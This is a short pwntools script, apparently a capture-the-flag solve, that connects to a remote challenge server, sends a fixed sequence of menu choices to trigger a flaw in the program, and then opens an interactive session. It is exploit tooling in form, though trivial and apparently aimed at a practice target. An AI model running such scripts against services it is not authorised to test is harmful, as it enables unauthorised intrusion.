from pwn import *

context.arch = "amd64"
context.os = "linux"
#context.log_level = "debug"

io = remote("node10.anna.nssnode.cn", 29621)

io.sendlineafter(b"> ", b"1")
for i in range(2):
    io.sendline(b"1")
    
io.sendlineafter(b"> ", b"2")
io.sendline(b"2")

sleep(1)

io.sendline(b"4")

io.interactive()